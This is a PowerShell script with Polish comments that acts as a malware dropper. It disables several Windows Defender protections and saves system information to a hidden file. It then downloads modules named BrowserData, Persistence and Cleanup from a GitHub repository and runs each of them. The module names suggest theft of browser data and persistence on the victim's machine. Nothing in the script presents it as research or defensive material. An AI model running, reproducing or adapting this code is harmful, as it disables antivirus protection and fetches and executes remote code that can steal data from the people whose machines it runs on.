#region Inicjalizacja
$ErrorActionPreference = 'SilentlyContinue'
$repoUrl = "https://raw.githubusercontent.com/dfassdaopiju/XzxX/refs/heads/main/"
$payloadName = "payload.ps1"

#region Mechanizmy Ochronne
# Funkcja do szyfrowania danych
function Encrypt-Data {
    param($Data)
    $secure = ConvertTo-SecureString $Data -AsPlainText -Force
    return ConvertFrom-SecureString $secure
}

#region Główna Logika
try {
    # Tymczasowe wyłączenie Windows Defender
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableBehaviorMonitoring $true
    Set-MpPreference -DisableScriptScanning $true
    Set-MpPreference -DisableIOAVProtection $true
    Set-MpPreference -DisableArchiveScanning $true

    # Tworzenie zabezpieczonego pliku z danymi systemowymi
    $systemData = systeminfo | Out-String
    $encryptedData = Encrypt-Data -Data $systemData
    $secureFilePath = "E:\SystemData_$(Get-Date -Format 'yyyyMMdd_HHmmss').enc"
    $encryptedData | Out-File -FilePath $secureFilePath
    attrib +s +h $secureFilePath

    # Pobranie i wykonanie dodatkowych modułów
    $modules = @('BrowserData.ps1', 'Persistence.ps1', 'Cleanup.ps1')
    foreach ($module in $modules) {
        $moduleUrl = "$repoUrl$module"
        $modulePath = "E:\$module"
        
        # Pobierz z walidacją TLS
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        (New-Object Net.WebClient).DownloadFile($moduleUrl, $modulePath)
        
        # Wykonaj moduł
        . $modulePath
    }
}
finally {
    # Przywrócenie ustawień Defender
    Set-MpPreference -DisableRealtimeMonitoring $false
    Set-MpPreference -DisableBehaviorMonitoring $false
    Set-MpPreference -DisableScriptScanning $false
}
#endregion
